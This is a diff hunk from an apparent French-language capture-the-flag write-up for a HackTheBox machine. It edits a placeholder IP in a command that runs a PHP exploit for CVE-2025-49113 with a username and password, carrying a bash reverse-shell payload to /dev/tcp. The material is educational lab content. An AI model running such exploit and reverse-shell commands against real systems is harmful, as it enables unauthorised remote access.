@@ -551,7 +551,7 @@ php CVE-2025-49113.php \
   http://mail.outbound.htb \
   tyler \
   'LhKL1o9Nm3X2' \
-  'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"'
+  'bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"'
 ```
 
 Le listener reçoit alors une connexion entrante et tu obtiens un shell en tant que :
